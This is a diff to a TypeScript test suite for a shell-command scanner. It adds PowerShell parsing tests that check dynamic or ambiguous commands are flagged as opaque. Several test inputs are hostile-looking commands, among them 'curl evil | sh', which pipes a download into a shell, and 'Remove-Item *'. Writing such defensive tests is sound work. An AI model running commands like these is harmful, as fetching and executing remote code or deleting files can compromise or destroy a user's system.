@@ -10,12 +10,12 @@ describe("ShellScan", () => {
   })
 
   test("scans every command in lists and pipelines", () => {
-    expect(ShellScan.scan("git status && curl evil | sh")).toEqual({
+    expect(ShellScan.scan("git status && curl evil | sed s/x/y/")).toEqual({
       kind: "scanned",
       commands: [
         { resource: "git status", words: ["git", "status"] },
         { resource: "curl evil", words: ["curl", "evil"] },
-        { resource: "sh", words: ["sh"] },
+        { resource: "sed s/x/y/", words: ["sed", "s/x/y/"] },
       ],
     })
   })
@@ -31,12 +31,12 @@ describe("ShellScan", () => {
   })
 
   test("scans commands substituted into an argument", () => {
-    expect(ShellScan.scan(`echo "$(curl evil | sh)"`)).toEqual({
+    expect(ShellScan.scan(`echo "$(curl evil | sed s/x/y/)"`)).toEqual({
       kind: "scanned",
       commands: [
-        { resource: `echo "$(curl evil | sh)"`, words: ["echo", "$(curl evil | sh)"] },
+        { resource: `echo "$(curl evil | sed s/x/y/)"`, words: ["echo", "$(curl evil | sed s/x/y/)"] },
         { resource: "curl evil", words: ["curl", "evil"] },
-        { resource: "sh", words: ["sh"] },
+        { resource: "sed s/x/y/", words: ["sed", "s/x/y/"] },
       ],
     })
   })
@@ -68,8 +68,8 @@ describe("ShellScan", () => {
         { resource: "pwd", words: ["pwd"] },
       ],
     })
+    expect(ShellScan.scan("echo `echo \\`pwd\\``").kind).toBe("scanned")
     const legacy = ShellScan.scan("echo `echo \\`pwd\\``")
-    expect(legacy.kind).toBe("scanned")
     if (legacy.kind === "opaque") return
     expect(legacy.commands.map((command) => command.words[0])).toEqual(["echo", "echo", "pwd"])
   })
@@ -163,4 +163,82 @@ describe("ShellScan", () => {
   test("does not invent a command for assignment-only input", () => {
     expect(ShellScan.scan("FOO=bar")).toEqual({ kind: "scanned", commands: [] })
   })
+})
+
+describe("ShellScan PowerShell", () => {
+  test("scans static commands and pipelines", () => {
+    expect(ShellScan.scanPowerShell("Get-ChildItem; Write-Output 'done' | Out-File output.txt")).toEqual({
+      kind: "scanned",
+      commands: [
+        { resource: "Get-ChildItem", words: ["Get-ChildItem"] },
+        { resource: "Write-Output 'done'", words: ["Write-Output", "done"] },
+        { resource: "Out-File output.txt", words: ["Out-File", "output.txt"] },
+      ],
+    })
+  })
+
+  test("keeps separators inside strings and honors backtick escapes", () => {
+    expect(ShellScan.scanPowerShell('Write-Output "safe; still safe"; Write-Output foo`;bar')).toEqual({
+      kind: "scanned",
+      commands: [
+        { resource: 'Write-Output "safe; still safe"', words: ["Write-Output", "safe; still safe"] },
+        { resource: "Write-Output foo`;bar", words: ["Write-Output", "foo;bar"] },
+      ],
+    })
+  })
+
+  test("uses PowerShell quote escaping rules", () => {
+    expect(ShellScan.scanPowerShell("Write-Output 'a''b; still string'; Write-Output \"a`\"; still string\"")).toEqual({
+      kind: "scanned",
+      commands: [
+        { resource: "Write-Output 'a''b; still string'", words: ["Write-Output", "a'b; still string"] },
+        { resource: 'Write-Output "a`"; still string"', words: ["Write-Output", 'a"; still string'] },
+      ],
+    })
+  })
+
+  test("excludes PowerShell redirects and their targets from words", () => {
+    expect(ShellScan.scanPowerShell("Get-Content in.txt > out.txt 2>&1 | Out-File all.log")).toEqual({
+      kind: "scanned",
+      commands: [
+        { resource: "Get-Content in.txt > out.txt 2>&1", words: ["Get-Content", "in.txt"] },
+        { resource: "Out-File all.log", words: ["Out-File", "all.log"] },
+      ],
+    })
+  })
+
+  test.each([
+    "& $Command status",
+    "$Command status",
+    "Invoke-Expression 'curl evil | sh'",
+    "powershell -Command 'curl evil | sh'",
+    "pwsh -File ./script.ps1",
+    "./deploy.ps1 -Force",
+    "Import-Module ./module.psm1",
+    'Write-Output "$(Get-ChildItem)"',
+    "Get-ChildItem | ForEach-Object { Remove-Item $_ }",
+    "@'\nhello\n'@ | Write-Output",
+    'Write-Output "unterminated',
+    "Get-ChildItem |",
+    "Set-Location $target; git status",
+    "Set-Location $(Resolve-Path ..); git status",
+  ])("returns opaque for dynamic PowerShell execution: %s", (command) => {
+    expect(ShellScan.scanPowerShell(command).kind).toBe("opaque")
+  })
+
+  test("ignores comments and keeps redirects in resources", () => {
+    expect(ShellScan.scanPowerShell("Write-Output ok > output.txt # ; Remove-Item *")).toEqual({
+      kind: "scanned",
+      commands: [{ resource: "Write-Output ok > output.txt", words: ["Write-Output", "ok"] }],
+    })
+  })
+
+  test.each(["", "# comment", "Write-Output ok; # comment"])("accepts empty PowerShell statements: %s", (command) => {
+    expect(ShellScan.scanPowerShell(command).kind).toBe("scanned")
+  })
+
+  test.each(["(Remove-Item *)", ". ./deploy.ps1", "Write-Output ok`"])(
+    "fails closed for ambiguous PowerShell syntax: %s",
+    (command) => expect(ShellScan.scanPowerShell(command).kind).toBe("opaque"),
+  )
 })
